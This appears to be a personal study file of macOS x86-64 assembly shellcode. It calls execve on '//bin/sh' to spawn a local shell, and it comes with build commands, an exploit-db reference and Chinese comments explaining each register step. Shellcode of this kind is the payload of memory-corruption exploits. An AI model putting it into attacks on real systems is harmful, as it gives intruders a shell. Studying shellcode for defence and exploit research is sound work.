; nasm -f macho64 execve.asm 
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o execve execve.o 

; 参考文章：https://www.exploit-db.com/exploits/46397

BITS    64
global  _main

section     .text
_main:
    ; execve("//bin/sh", 0, 0)
    xor     rax, rax        ; rax = 0
    cdq                     ; 不知道啥意思，debug 这步 rdx=0
    push    rax             ; rax 压入栈
    mov     rdi, '//bin/sh' ; rdi = '//bin/sh'
    push    rdi             ; $rdi 压入栈 (1)
    push    rsp             ; rsp 压入栈
    pop     rdi             ; 推出 rsp，rdi 指向 (1)
    xor     rsi, rsi        ; rsi = 0
    mov     al, 0x2         ; rax = 0x2
    ror     rax, 0x28       ; 左移 rax = 0x2000000
    mov     al, 0x3b        ; rax = execve 
    syscall